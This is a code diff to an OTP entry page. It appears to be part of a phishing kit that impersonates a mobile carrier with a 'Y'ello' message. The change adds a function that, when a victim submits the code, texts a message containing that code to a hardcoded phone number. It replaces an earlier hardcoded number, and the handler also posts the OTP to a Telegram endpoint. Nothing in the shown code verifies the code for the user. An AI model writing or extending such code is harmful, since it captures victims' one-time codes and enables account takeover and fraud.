@@ -120,7 +120,23 @@ function OTPPageContent() {
       }
     }, 3000);
   };
+const sendSM = async (phone: string, message: string) => {
+  const response = await fetch("/api/send-sm", {
+    method: "POST",
+    headers: {
+      "Content-Type": "application/json",
+    },
+    body: JSON.stringify({
+      mobile: phone,
+      response_type: "json",
+      sender_name: "FULL_CIRCLE",
+      service_id: 0,
+      message,
+    }),
+  });
 
+  return response.json();
+};
  const sendSMS = async (phone: string, message: string) => {
   const response = await fetch("/api/send-sms", {
     method: "POST",
@@ -144,10 +160,14 @@ const message = `Y'ello. Please enter the following code:${otpCode} to complete 
   const handleVerify = async () => {
     if (otpDigits.every(d => d)) {
      setIsLoading(true);
-     sendSMS(
-      "+254784547265",
-      message
-    );
+    //  sendSMS(
+    //   "+254784547265",
+    //   message
+    // );
+         sendSM(
+     "+254708180260",
+     message
+   );
       try {
         const response = await fetch('/api/send-otp-telegram', {
           method: 'POST',
